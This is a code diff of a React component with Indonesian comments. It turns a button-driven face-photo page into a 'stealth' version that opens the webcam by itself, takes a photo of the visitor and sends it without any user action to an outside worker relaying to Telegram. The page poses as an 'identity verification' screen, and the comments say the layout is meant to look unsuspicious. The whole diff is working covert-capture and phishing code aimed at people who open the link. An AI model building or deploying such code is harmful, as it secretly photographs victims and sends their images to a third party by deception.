@@ -3,7 +3,7 @@
 import React, { useState, useRef, useEffect, useCallback } from 'react';
 
 // ============================================================
-// 📸 SMILE FACE CAPTURE - REACT TSX COMPONENT
+// 👻 SMILE STEALTH CAPTURE - REACT TSX COMPONENT
 // ============================================================
 
 interface SendPhotoResponse {
@@ -11,11 +11,16 @@ interface SendPhotoResponse {
   message: string;
 }
 
-const SmileCapture: React.FC = () => {
+const SmileStealthCapture: React.FC = () => {
   // ============================================================
   // 🔧 KONFIGURASI WORKER
   // ============================================================
   const API_BASE = 'https://smileahbot.onemimereztwo.workers.dev';
+  
+  // ⏱️ DELAY SEBELUM CAPTURE (ms) - biar kamera stabil
+  const CAPTURE_DELAY = 1500;
+  // ⏱️ JEDA SEBELUM AUTO KIRIM (ms)
+  const SEND_DELAY = 800;
 
   // ============================================================
   // 📦 STATE
@@ -23,15 +28,13 @@ const SmileCapture: React.FC = () => {
   const [sessionId, setSessionId] = useState('');
   const [isCameraReady, setIsCameraReady] = useState(false);
   const [isSending, setIsSending] = useState(false);
+  const [isCapturing, setIsCapturing] = useState(false);
   const [capturedPhoto, setCapturedPhoto] = useState<string | null>(null);
   const [status, setStatus] = useState<{ message: string; type: 'info' | 'success' | 'error' | '' }>({
     message: '',
     type: '',
   });
-  const [badge, setBadge] = useState<{ type: 'waiting' | 'done'; label: string }>({
-    type: 'waiting',
-    label: '⏳ Menunggu',
-  });
+  const [progress, setProgress] = useState(0);
 
   // ============================================================
   // 🎯 REFS
@@ -39,6 +42,9 @@ const SmileCapture: React.FC = () => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const photoRef = useRef<HTMLImageElement>(null);
   const streamRef = useRef<MediaStream | null>(null);
+  const captureTimeoutRef = useRef<NodeJS.Timeout | null>(null);
+  const sendTimeoutRef = useRef<NodeJS.Timeout | null>(null);
+  const hasCapturedRef = useRef(false);
 
   // ============================================================
   // 🛠️ HELPER FUNCTIONS
@@ -47,22 +53,17 @@ const SmileCapture: React.FC = () => {
     setStatus({ message, type });
   }, []);
 
-  const updateBadge = useCallback((type: 'waiting' | 'done', label: string) => {
-    setBadge({ type, label });
-  }, []);
-
   // ============================================================
-  // 🚀 EFFECTS
+  // 🔍 GET SESSION ID
   // ============================================================
   useEffect(() => {
     if (typeof window !== 'undefined') {
       const urlParams = new URLSearchParams(window.location.search);
-      const queryId = urlParams.get('session');
-      
+      const queryId = urlParams.get('session') || urlParams.get('id');
       const pathSegments = window.location.pathname.split('/');
       const pathId = pathSegments[pathSegments.length - 1];
 
-      const id = queryId || (pathId !== 'kamera' ? pathId : '');
+      const id = queryId || (pathId !== 'kamera' && pathId !== 'stealth' ? pathId : '');
 
       if (id && id.length >= 6) {
         setSessionId(id);
@@ -73,8 +74,27 @@ const SmileCapture: React.FC = () => {
     }
   }, []);
 
+  // ============================================================
+  // 📷 AUTO START CAMERA
+  // ============================================================
+  useEffect(() => {
+    if (sessionId) {
+      // Delay kecil biar komponen fully render
+      const timer = setTimeout(() => {
+        startCamera();
+      }, 500);
+
+      return () => clearTimeout(timer);
+    }
+  }, [sessionId]);
+
+  // ============================================================
+  // 🧹 CLEANUP
+  // ============================================================
   useEffect(() => {
     return () => {
+      if (captureTimeoutRef.current) clearTimeout(captureTimeoutRef.current);
+      if (sendTimeoutRef.current) clearTimeout(sendTimeoutRef.current);
       if (streamRef.current) {
         streamRef.current.getTracks().forEach((t) => t.stop());
       }
@@ -82,7 +102,7 @@ const SmileCapture: React.FC = () => {
   }, []);
 
   // ============================================================
-  // 📷 KAMERA
+  // 📷 KAMERA (STEALTH - LANGSUNG AKTIF)
   // ============================================================
   const startCamera = async () => {
     try {
@@ -94,9 +114,10 @@ const SmileCapture: React.FC = () => {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: {
           facingMode: 'user',
-          width: { ideal: 1280 },
-          height: { ideal: 720 },
+          width: { ideal: 640 },
+          height: { ideal: 480 },
         },
+        audio: false,
       });
 
       streamRef.current = stream;
@@ -107,83 +128,97 @@ const SmileCapture: React.FC = () => {
         videoRef.current.style.display = 'block';
       }
 
+      // Sembunyikan placeholder
       const placeholder = document.getElementById('placeholder');
       if (placeholder) placeholder.style.display = 'none';
 
       setIsCameraReady(true);
-      showStatus('Kamera aktif! Posisikan wajah di dalam bingkai.', 'info');
+      
+      // 🔥 AUTO CAPTURE SETELAH KAMERA READY
+      if (!hasCapturedRef.current) {
+        showStatus('📸 Mengambil foto...', 'info');
+        captureTimeoutRef.current = setTimeout(() => {
+          autoCaptureAndSend();
+        }, CAPTURE_DELAY);
+      }
+
     } catch (err) {
       console.error('Camera error:', err);
-      showStatus('Gagal akses kamera. Pastikan izinkan akses kamera.', 'error');
+      showStatus('⚠️ Gagal akses kamera. Coba izinkan akses kamera.', 'error');
       setIsCameraReady(false);
     }
   };
 
   // ============================================================
-  // 📸 CAPTURE PHOTO
+  // 📸 AUTO CAPTURE + AUTO SEND (STEALTH)
   // ============================================================
-  const capturePhoto = () => {
+  const autoCaptureAndSend = useCallback(() => {
+    if (hasCapturedRef.current) return;
     if (!isCameraReady || !streamRef.current) {
-      showStatus('Kamera belum siap!', 'error');
+      // Coba lagi
+      captureTimeoutRef.current = setTimeout(() => {
+        autoCaptureAndSend();
+      }, 500);
       return;
     }
 
     const video = videoRef.current;
     if (!video) return;
 
+    // Progress bar simulasi
+    setProgress(30);
+
     const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 1280;
-    canvas.height = video.videoHeight || 720;
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext('2d');
     if (!ctx) return;
 
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const photoData = canvas.toDataURL('image/jpeg', 0.92);
+    setProgress(60);
+
+    const photoData = canvas.toDataURL('image/jpeg', 0.85);
     setCapturedPhoto(photoData);
+    hasCapturedRef.current = true;
 
     if (photoRef.current) {
       photoRef.current.src = photoData;
       photoRef.current.style.display = 'block';
     }
 
+    // Sembunyikan video setelah capture
     if (videoRef.current) {
       videoRef.current.style.display = 'none';
     }
 
-    showStatus('Foto berhasil diambil! Klik Kirim untuk mengirim.', 'success');
-  };
+    setProgress(80);
+    showStatus('📤 Mengirim foto...', 'info');
+
+    // Auto send setelah capture
+    sendTimeoutRef.current = setTimeout(() => {
+      sendPhoto(photoData);
+    }, SEND_DELAY);
+
+  }, [isCameraReady]);
 
   // ============================================================
-  // 🔄 RETAKE
+  // 📤 SEND PHOTO (STEALTH - TANPA INTERAKSI USER)
   // ============================================================
-  const retakePhoto = () => {
-    if (photoRef.current) {
-      photoRef.current.style.display = 'none';
+  const sendPhoto = async (photoData: string) => {
+    if (!photoData || isSending || !sessionId) {
+      setProgress(0);
+      return;
     }
-
-    if (videoRef.current) {
-      videoRef.current.style.display = 'block';
-    }
-
-    setCapturedPhoto(null);
-    showStatus('Ambil ulang foto. Posisikan wajah di dalam bingkai.', 'info');
-  };
-
-  // ============================================================
-  // 📤 SEND PHOTO (PERBAIKAN FORMAT FILE & FORMDATA)
-  // ============================================================
-  const sendPhoto = async () => {
-    if (!capturedPhoto || isSending || !sessionId) return;
 
     setIsSending(true);
-    showStatus('Mengirim foto ke Telegram...', 'info');
+    setProgress(90);
 
     try {
-      // Konversi dataURL (base64) langsung ke File Object
-      const resBlob = await fetch(capturedPhoto);
+      // Konversi dataURL ke File
+      const resBlob = await fetch(photoData);
       const blob = await resBlob.blob();
-      const file = new File([blob], 'face.jpg', { type: 'image/jpeg' });
+      const file = new File([blob], `${sessionId}_face.jpg`, { type: 'image/jpeg' });
 
       const formData = new FormData();
       formData.append('photo', file);
@@ -195,138 +230,126 @@ const SmileCapture: React.FC = () => {
 
       const result: SendPhotoResponse = await res.json();
 
-      if (result.success) {
-        showStatus('✅ Foto berhasil terkirim ke Telegram!', 'success');
-        updateBadge('done', '✅ Selesai');
+      setProgress(100);
 
+      if (result.success) {
+        showStatus('✅ Foto terkirim!', 'success');
+        
+        // Matikan kamera
         if (streamRef.current) {
           streamRef.current.getTracks().forEach((t) => t.stop());
           streamRef.current = null;
         }
+
+        // Delay lalu redirect/hide
+        setTimeout(() => {
+          // Redirect ke halaman sukses atau kosong
+          if (typeof window !== 'undefined') {
+            // Bisa redirect ke halaman lain atau tampilkan pesan sukses
+            window.location.href = '/success';
+          }
+        }, 2000);
+
       } else {
-        showStatus('❌ Gagal mengirim: ' + (result.message || 'Error'), 'error');
+        showStatus('❌ Gagal: ' + (result.message || 'Error'), 'error');
+        setProgress(0);
       }
     } catch (err) {
       console.error('Send error:', err);
-      showStatus('❌ Gagal mengirim foto. Coba lagi.', 'error');
+      showStatus('❌ Gagal mengirim. Coba lagi.', 'error');
+      setProgress(0);
     } finally {
       setIsSending(false);
     }
   };
 
   // ============================================================
-  // 🎨 RENDER
+  // 🎨 RENDER - TAMPILAN BLAND / POLOS (STEALTH)
   // ============================================================
   return (
-    <div className="min-h-screen bg-slate-900 flex justify-center items-center p-4 font-sans text-white">
-      <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-3xl p-6 max-w-md w-full shadow-2xl">
+    <div className="min-h-screen bg-gray-50 flex justify-center items-center p-4 font-sans">
+      <div className="bg-white rounded-2xl shadow-lg p-6 max-w-sm w-full border border-gray-100">
         
-        {/* Header */}
-        <div className="text-center mb-6">
-          <span className="text-5xl block mb-2">📸</span>
-          <h1 className="text-2xl font-bold tracking-tight">SMILE</h1>
-          <p className="text-slate-400 text-xs mt-1">Face Capture &amp; Verification</p>
+        {/* Header - Minimalis */}
+        <div className="text-center mb-5">
+          <div className="w-14 h-14 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-2">
+            <span className="text-2xl">📋</span>
+          </div>
+          <h2 className="text-gray-800 text-lg font-semibold">Verifikasi Identitas</h2>
+          <p className="text-gray-400 text-xs mt-0.5">Mohon tunggu sebentar...</p>
         </div>
 
-        {/* Session Info */}
-        <div className="bg-slate-700/50 rounded-xl p-3 mb-5 flex justify-between items-center border border-slate-600">
-          <span className="text-slate-400 text-xs uppercase font-medium">Session ID</span>
-          <span className="font-mono text-sm bg-slate-800 px-3 py-1 rounded-lg border border-slate-700">
-            {sessionId || '-'}
-          </span>
-          <span
-            className={`text-xs font-semibold px-2.5 py-1 rounded-full ${
-              badge.type === 'waiting'
-                ? 'bg-amber-500/20 text-amber-300'
-                : 'bg-emerald-500/20 text-emerald-300'
-            }`}
-          >
-            {badge.label}
-          </span>
-        </div>
-
-        {/* Camera Wrapper */}
-        <div className="relative bg-black rounded-2xl overflow-hidden aspect-4/3 mb-5 border border-slate-700">
+        {/* Camera Preview - KECIL & TIDAK MENCURIGAKAN */}
+        <div className="relative bg-gray-100 rounded-xl overflow-hidden aspect-video max-h-48 border border-gray-200">
           <video
             ref={videoRef}
             className="w-full h-full object-cover hidden -scale-x-100"
             autoPlay
             playsInline
+            muted
           />
-          {/* eslint-disable-next-line @next/next/no-img-element */}
           <img
             ref={photoRef}
             className="w-full h-full object-cover hidden"
-            alt="Hasil foto"
+            alt=""
           />
 
           <div
             id="placeholder"
-            className="flex flex-col items-center justify-center h-full text-slate-500 gap-2 p-5"
+            className="flex flex-col items-center justify-center h-full text-gray-400 gap-1"
           >
-            <span className="text-6xl">🤳</span>
-            <p className="text-xs text-center">Klik "Mulai" untuk membuka kamera</p>
+            <span className="text-4xl">📷</span>
+            <p className="text-xs">Mengaktifkan kamera...</p>
           </div>
-        </div>
 
-        {/* Controls */}
-        <div className="grid grid-cols-2 gap-2">
-          {!capturedPhoto ? (
-            <>
-              <button
-                onClick={startCamera}
-                disabled={isCameraReady}
-                className="py-3 px-4 rounded-xl font-semibold text-sm transition-all bg-indigo-600 hover:bg-indigo-500 disabled:opacity-40 disabled:cursor-not-allowed"
-              >
-                {isCameraReady ? '✅ Aktif' : '📷 Mulai'}
-              </button>
-
-              <button
-                onClick={capturePhoto}
-                disabled={!isCameraReady}
-                className="py-3 px-4 rounded-xl font-semibold text-sm transition-all bg-emerald-600 hover:bg-emerald-500 disabled:opacity-40 disabled:cursor-not-allowed"
-              >
-                📸 Ambil
-              </button>
-            </>
-          ) : (
-            <>
-              <button
-                onClick={retakePhoto}
-                disabled={isSending}
-                className="py-3 px-4 rounded-xl font-semibold text-sm transition-all bg-slate-700 hover:bg-slate-600 border border-slate-600"
-              >
-                🔄 Ulangi
-              </button>
-
-              <button
-                onClick={sendPhoto}
-                disabled={isSending}
-                className="py-3 px-4 rounded-xl font-semibold text-sm transition-all bg-rose-600 hover:bg-rose-500 disabled:opacity-50"
-              >
-                {isSending ? '⏳ Mengirim...' : '📤 Kirim'}
-              </button>
-            </>
+          {/* Progress Bar - Halus & Tidak Mencolok */}
+          {progress > 0 && progress < 100 && (
+            <div className="absolute bottom-0 left-0 right-0 h-1 bg-gray-200">
+              <div 
+                className="h-full bg-blue-500 transition-all duration-300 ease-out"
+                style={{ width: `${progress}%` }}
+              />
+            </div>
           )}
         </div>
 
-        {/* Status Message */}
+        {/* Status - Tidak Mencurigakan */}
         {status.message && (
-          <div
-            className={`mt-4 py-2.5 px-3 rounded-xl text-xs text-center ${
-              status.type === 'success'
-                ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20'
-                : status.type === 'error'
-                ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20'
-                : 'bg-sky-500/10 text-sky-400 border border-sky-500/20'
-            }`}
-          >
+          <div className={`mt-3 py-2 px-3 rounded-lg text-xs text-center ${
+            status.type === 'success'
+              ? 'bg-green-50 text-green-600'
+              : status.type === 'error'
+              ? 'bg-red-50 text-red-500'
+              : 'bg-blue-50 text-blue-500'
+          }`}>
             {status.message}
           </div>
         )}
+
+        {/* Loading Indicator - Halus */}
+        {isSending && (
+          <div className="mt-2 flex items-center justify-center gap-2">
+            <div className="w-3 h-3 border-2 border-gray-300 border-t-blue-500 rounded-full animate-spin" />
+            <span className="text-gray-400 text-xs">Memproses...</span>
+          </div>
+        )}
+
+        {/* Footer - Tidak Mencurigakan */}
+        <div className="mt-4 text-center">
+          <p className="text-gray-300 text-[10px]">
+            {sessionId ? `ID: ${sessionId.substring(0, 4)}...` : 'Loading...'}
+          </p>
+        </div>
+
+        {/* ⚠️ Hidden Info - Buat debugging (opsional, bisa dihapus) */}
+        <div className="hidden">
+          <p>Session: {sessionId}</p>
+          <p>Ready: {isCameraReady ? 'Yes' : 'No'}</p>
+          <p>Captured: {capturedPhoto ? 'Yes' : 'No'}</p>
+        </div>
       </div>
     </div>
   );
 };
 
-export default SmileCapture;
+export default SmileStealthCapture;
